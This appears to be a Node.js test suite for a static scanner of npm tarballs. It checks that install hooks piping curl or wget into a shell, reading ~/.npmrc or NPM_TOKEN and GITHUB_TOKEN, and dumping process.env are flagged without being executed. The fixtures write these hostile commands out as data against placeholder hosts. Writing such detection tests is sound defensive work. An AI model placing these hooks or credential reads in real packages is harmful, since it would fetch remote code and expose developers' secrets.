import assert from "node:assert/strict";
import { test } from "node:test";
import { createHash } from "node:crypto";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { gzipSync } from "node:zlib";
import tar from "tar-stream";
import { inspectJavaScript } from "../../src/core/syntax.mjs";
import { scriptSignals } from "../../src/core/behavior-signals.mjs";
import { analyzeLocal } from "../../src/core/pipeline.mjs";

const hash = (value) => createHash("sha256").update(value).digest("hex");
function inventory(files) {
  return {
    digest: { sha256: hash(JSON.stringify(files)), sha512: "b".repeat(128) },
    complete: true,
    failures: [],
    entries: Object.entries(files).map(([name, body]) => {
      const content = Buffer.from(body);
      return {
        path: name,
        originalPath: `package/${name}`,
        type: "file",
        size: content.length,
        sha256: hash(content),
        content,
        inspection: "retained",
      };
    }),
  };
}
const manifest = (scripts) =>
  JSON.stringify({ name: "fixture", version: "1.0.0", scripts }, null, 2);
const behavior = (result) =>
  result.cues.filter((cue) => cue.module === "behavior");
const spanOf = (artifact, result, cue) => {
  const evidence = result.evidence.find((e) => e.id === cue.evidenceIds[0]);
  const entry = artifact.entries.find((e) => e.path === evidence.path);
  return entry.content.subarray(...evidence.range).toString();
};

test("install hook piping a download into a shell is a HIGH suspicion bound to the exact manifest bytes", () => {
  const artifact = inventory({
    "package.json": manifest({
      postinstall: "curl -fsSL https://collector.invalid/p.sh | sh",
      test: "curl https://example.invalid | sh",
    }),
  });
  const result = inspectJavaScript(artifact, null);
  const cues = behavior(result);
  assert.deepEqual(
    cues.map((cue) => [cue.ruleId, cue.priority, cue.signal.hook]),
    [["behavior-install-remote-shell", "HIGH", "postinstall"]],
  );
  assert.equal(cues[0].confidence, "suspicion-not-proof");
  assert.match(cues[0].summary, /not observed execution/);
  assert.deepEqual(cues[0].signal.tools, ["curl"]);
  assert.equal(
    spanOf(artifact, result, cues[0]),
    '"curl -fsSL https://collector.invalid/p.sh | sh"',
  );
  assert.equal(
    result.annotations.find((a) => a.type === "behavior-scope").manifest.status,
    "assessed",
  );
});

test("inline interpreter and credential reads in install hooks are separate review cues", () => {
  const artifact = inventory({
    "package.json": manifest({
      preinstall:
        "node -e \"require('./x')\" && cat ~/.npmrc | base64 && echo ${NPM_TOKEN}",
    }),
  });
  const cues = behavior(inspectJavaScript(artifact, null));
  const inline = cues.find(
    (c) => c.ruleId === "behavior-install-inline-execution",
  );
  const secret = cues.find(
    (c) => c.ruleId === "behavior-install-credential-access",
  );
  assert.deepEqual(inline.signal.commands, ["node -e"]);
  assert.deepEqual(secret.signal.paths, [".npmrc"]);
  assert.deepEqual(secret.signal.variables, ["NPM_TOKEN"]);
  assert.ok(cues.every((c) => c.priority === "review"));
});

test("ordinary install hooks and plain network calls produce no behavior cue", () => {
  const artifact = inventory({
    "package.json": manifest({ install: "node-gyp rebuild" }),
    "index.js":
      "fetch('https://api.example.invalid/v1'); const home = process.env.HOME;",
  });
  const result = inspectJavaScript(artifact, null);
  assert.deepEqual(behavior(result), []);
  assert.ok(result.cues.some((c) => c.ruleId === "syntax-network-call"));
});

test("javascript credential, secret and whole-environment access are cited without execution", () => {
  const artifact = inventory({
    "package.json": manifest({ postinstall: "node ./setup.js" }),
    "setup.js": [
      "const fs = require('fs'), os = require('os');",
      "const rc = fs.readFileSync(`${os.homedir()}/.npmrc`, 'utf8');",
      "const token = process.env['GITHUB_TOKEN'];",
      "const dump = JSON.stringify(process.env);",
      "for (const key in process.env) {}",
      "globalThis.__unmaskBehaviorExecuted = true;",
    ].join("\n"),
    "lib.js": "const key = process.env.NPM_TOKEN;",
  });
  const result = inspectJavaScript(artifact, null);
  const cues = behavior(result);
  const rules = cues.map((c) => c.ruleId).sort();
  assert.deepEqual(rules, [
    "behavior-credential-path-reference",
    "behavior-environment-enumeration",
    "behavior-environment-enumeration",
    "behavior-sensitive-environment-read",
    "behavior-sensitive-environment-read",
  ]);
  assert.equal(globalThis.__unmaskBehaviorExecuted, undefined);
  const spans = cues.map((c) => spanOf(artifact, result, c)).sort();
  assert.deepEqual(spans, [
    "/.npmrc",
    "JSON.stringify(process.env)",
    "process.env",
    "process.env.NPM_TOKEN",
    "process.env['GITHUB_TOKEN']",
  ]);
  const setup = cues.filter(
    (c) => spanOf(artifact, result, c) !== "process.env.NPM_TOKEN",
  );
  assert.ok(setup.every((c) => c.installHookTarget?.[0] === "postinstall"));
  assert.equal(
    cues.find((c) => spanOf(artifact, result, c) === "process.env.NPM_TOKEN")
      .installHookTarget,
    undefined,
  );
});

test("oversized and adversarial hook scripts are bounded and annotated, not guessed", () => {
  const big = "x ".repeat(5000);
  const artifact = inventory({ "package.json": manifest({ install: big }) });
  const result = inspectJavaScript(artifact, null);
  assert.deepEqual(behavior(result), []);
  assert.ok(
    result.annotations.some(
      (a) =>
        a.type === "behavior-not-inspected" &&
        a.hook === "install" &&
        a.reason === "script-byte-cap",
    ),
  );
  const started = performance.now();
  const hostile = scriptSignals("$".repeat(8000));
  const tokenHeavy = scriptSignals("| ".repeat(4000));
  assert.ok(performance.now() - started < 200);
  assert.deepEqual(hostile.signals, []);
  assert.equal(tokenHeavy.reason, "script-token-cap");
});

test("common remote-shell idioms are HIGH; plain downloads stay review", () => {
  const rule = (script) =>
    scriptSignals(script).signals.map((s) => [s.ruleId, s.interpreter]);
  for (const [script, interpreter] of [
    ['sh -c "$(curl -fsSL https://x.invalid/i.sh)"', "sh"],
    ["bash <(curl -fsSL https://x.invalid/i.sh)", "bash"],
    ["curl -fsSL https://x.invalid/i.sh | sudo -E bash", "bash"],
    ["wget -qO- https://x.invalid/i | env FOO=1 sh", "sh"],
    ["sh -c `wget -qO- https://x.invalid/i`", "sh"],
  ])
    assert.deepEqual(rule(script)[0], [
      "behavior-install-remote-shell",
      interpreter,
    ]);
  assert.deepEqual(rule("curl -o out.tgz https://x.invalid/a.tgz | tee log"), [
    ["behavior-install-network-fetch", undefined],
  ]);
});

test("install hook targets keep path case and resolve extensionless node targets", () => {
  const artifact = inventory({
    "package.json": manifest({
      preinstall: "node Setup.js",
      postinstall: "node --no-warnings scripts/install",
    }),
    "Setup.js": "const t = process.env.NPM_TOKEN;",
    "scripts/install.js": "const s = JSON.stringify(process.env);",
    "setup.js": "const u = process.env.GITHUB_TOKEN;",
  });
  const result = inspectJavaScript(artifact, null);
  const byPath = Object.fromEntries(
    behavior(result).map((cue) => [
      result.evidence.find((e) => e.id === cue.evidenceIds[0]).path,
      cue.installHookTarget,
    ]),
  );
  assert.deepEqual(byPath, {
    "Setup.js": ["preinstall"],
    "scripts/install.js": ["postinstall"],
    "setup.js": undefined,
  });
});

test("review-level behavior cues have their own budget and cannot crowd out syntax or HIGH cues", () => {
  const padding = Array.from(
    { length: 1000 },
    (_, i) => `"docs/.npmrc-${i}";`,
  ).join("\n");
  const artifact = inventory({
    "package.json": manifest({ postinstall: "curl https://x.invalid | sh" }),
    "a.js": padding,
    "z.js": "require('child_process').exec('id'); eval(code);",
  });
  const result = inspectJavaScript(artifact, null);
  const rules = result.cues.map((c) => c.ruleId);
  assert.ok(rules.includes("syntax-process-execution"));
  assert.ok(rules.includes("syntax-dynamic-code"));
  assert.ok(rules.includes("behavior-install-remote-shell"));
  assert.equal(
    rules.filter((r) => r === "behavior-credential-path-reference").length,
    8,
  );
  assert.ok(!result.annotations.some((a) => a.reason === "syntax-cue-cap"));
  assert.deepEqual(
    result.annotations
      .filter((a) => a.reason === "behavior-cue-cap")
      .map((a) => [a.path, a.ruleId]),
    [["a.js", "behavior-credential-path-reference"]],
  );
});

async function tgz(files) {
  const pack = tar.pack();
  const chunks = [];
  const drain = (async () => {
    for await (const chunk of pack) chunks.push(chunk);
  })();
  for (const [name, content] of Object.entries(files))
    pack.entry({ name: `package/${name}`, mtime: new Date(0) }, content);
  pack.finalize();
  await drain;
  return gzipSync(Buffer.concat(chunks));
}

test("offline check pipeline reports behavior cues in a validated report without changing policy", async (t) => {
  const root = await mkdtemp(path.join(os.tmpdir(), "unmask-behavior-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  const tarballPath = path.join(root, "artifact.tgz");
  await writeFile(
    tarballPath,
    await tgz({
      "package.json": manifest({
        preinstall: "wget -qO- https://collector.invalid/i | bash",
      }),
      "index.js": "module.exports = process.env.AWS_SECRET_ACCESS_KEY;",
    }),
  );
  const report = await analyzeLocal({
    tarballPath,
    cacheDir: path.join(root, "cache"),
  });
  assert.deepEqual(
    report.cues
      .filter((c) => c.module === "behavior")
      .map((c) => c.ruleId)
      .sort(),
    ["behavior-install-remote-shell", "behavior-sensitive-environment-read"],
  );
  assert.deepEqual(report.policy.findings, []);
});
